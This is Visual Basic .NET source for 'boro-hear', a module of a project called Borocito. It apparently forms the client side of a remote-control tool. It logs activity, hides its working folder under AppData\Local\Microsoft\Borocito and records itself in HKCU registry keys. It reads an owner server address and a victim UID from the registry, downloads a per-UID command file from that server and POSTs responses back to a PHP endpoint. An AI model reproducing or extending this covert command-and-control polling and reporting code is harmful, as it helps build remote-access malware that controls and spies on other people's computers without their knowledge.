Imports System.Runtime.InteropServices
Imports System.Text
Imports Microsoft.Win32
Imports System.Net
Imports System.IO
Module Utility
    Public tlmContent As String
    Sub AddToLog(ByVal from As String, ByVal content As String, Optional ByVal flag As Boolean = False)
        Try
            Dim OverWrite As Boolean = False
            If My.Computer.FileSystem.FileExists(DIRCommons & "\" & My.Application.Info.AssemblyName & ".log") Then
                OverWrite = True
            End If
            Dim finalContent As String = Nothing
            If flag = True Then
                finalContent = " [!!!]"
            End If
            Dim Message As String = DateTime.Now.ToString("hh:mm:ss tt dd/MM/yyyy") & finalContent & " [" & from & "] " & content
            tlmContent = tlmContent & Message & vbCrLf
            Console.WriteLine("[" & from & "]" & finalContent & " " & content)
            Try
                My.Computer.FileSystem.WriteAllText(DIRCommons & "\" & My.Application.Info.AssemblyName & ".log", vbCrLf & Message, OverWrite)
            Catch
            End Try
        Catch ex As Exception
            Console.WriteLine("[AddToLog@Utility]Error: " & ex.Message)
        End Try
    End Sub
    <DllImport("kernel32")>
    Private Function GetPrivateProfileString(ByVal section As String, ByVal key As String, ByVal def As String, ByVal retVal As StringBuilder, ByVal size As Integer, ByVal filePath As String) As Integer
        'Use GetIniValue("KEY_HERE", "SubKEY_HERE", "filepath")
    End Function
    Public Function GetIniValue(section As String, key As String, filename As String, Optional defaultValue As String = Nothing) As String
        Dim sb As New StringBuilder(500)
        If GetPrivateProfileString(section, key, defaultValue, sb, sb.Capacity, filename) > 0 Then
            Return sb.ToString
        Else
            Return defaultValue
        End If
    End Function
End Module
Module GlobalUses
    Public parameters As String
    Public DIRCommons As String = "C:\Users\" & Environment.UserName & "\AppData\Local\Microsoft\Borocito\boro-hear"

    Public HttpOwnerServer As String
    Public UID As String

    Public sendStatus As Boolean = True
End Module
Module StartUp
    Sub Init()
        Try
            CommonActions()
            CheckInstall()
        Catch ex As Exception
            AddToLog("Init@StartUp", "Error: " & ex.Message, True)
        End Try
    End Sub
    Sub CommonActions()
        Try
            If Not My.Computer.FileSystem.DirectoryExists(DIRCommons) Then
                My.Computer.FileSystem.CreateDirectory(DIRCommons)
            End If
        Catch ex As Exception
            AddToLog("CommonActions@StartUp", "Error: " & ex.Message, True)
        End Try
    End Sub
    Sub CheckInstall()
        Try
            Dim regKey As RegistryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Borocito\\boro-hear", True)
            If regKey Is Nothing Then
                Registry.CurrentUser.CreateSubKey("SOFTWARE\\Borocito\\boro-hear")
                regKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Borocito\\boro-hear", True)
            End If

            regKey.SetValue("boro-hear", Application.ExecutablePath)
            regKey.SetValue("Name", My.Application.Info.AssemblyName)
            regKey.SetValue("Version", My.Application.Info.Version.ToString)

            regKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Borocito", True)
            HttpOwnerServer = "http://" & regKey.GetValue("OwnerServer")
            UID = regKey.GetValue("UID")
        Catch ex As Exception
            AddToLog("CheckInstall@StartUp", "Error: " & ex.Message, True)
            End
        End Try
    End Sub
End Module
Module ResponseAdministrator
    Sub SendToServer(ByVal message As String)
        Try
            If sendStatus Then
                AddToLog("SendToServer@server_CONNECT", "Processing: " & message, False)
                'Create CMD file on server
                Dim request As WebRequest = WebRequest.Create(HttpOwnerServer & "/Users/Commands/cliResponse.php")
                request.Method = "POST"
                'Obtener comando actual (evita interferir)
                Dim remoteCommandFile As String = HttpOwnerServer & "/Users/Commands/[" & UID & "]Command.str"
                Dim localCommandFile As String = DIRCommons & "\actualCommand.str"
                If My.Computer.FileSystem.FileExists(localCommandFile) Then
                    My.Computer.FileSystem.DeleteFile(localCommandFile)
                End If
                My.Computer.Network.DownloadFile(remoteCommandFile, localCommandFile)
                Dim lineas = IO.File.ReadAllLines(localCommandFile)
                'Prepara el mensaje
                Dim postData As String = "ident=" & UID & "&text=" & "#boro-hear response (" & DateTime.Now.ToString("hh:mm:ss tt dd/MM/yyyy") & ")" &
                    vbCrLf & "Command1>" & lineas(1).Split(">"c)(1).Trim() &
                    vbCrLf & "Command2>" &
                    vbCrLf & "Command3>" &
                    vbCrLf & "[Response]" &
                    vbCrLf & "(BORO-HEAR) " & message
                Dim byteArray As Byte() = Encoding.UTF8.GetBytes(postData)
                request.ContentType = "application/x-www-form-urlencoded"
                request.ContentLength = byteArray.Length
                Dim dataStream As Stream = request.GetRequestStream()
                dataStream.Write(byteArray, 0, byteArray.Length)
                dataStream.Close()
                Dim response As WebResponse = request.GetResponse()
                AddToLog("SendToServer@server_CONNECT", "Response: " & CType(response, HttpWebResponse).StatusDescription, False)
                'If CType(response, HttpWebResponse).StatusDescription = "OK" Then
                'End If
                response.Close()
            Else
                AddToLog("SendToServer@server_CONNECT", "boro-hear paused. Can't process: " & message, False)
            End If
        Catch ex As Exception
            AddToLog("SendToServer@server_CONNECT", "Error: " & ex.Message, True)
        End Try
    End Sub
End Module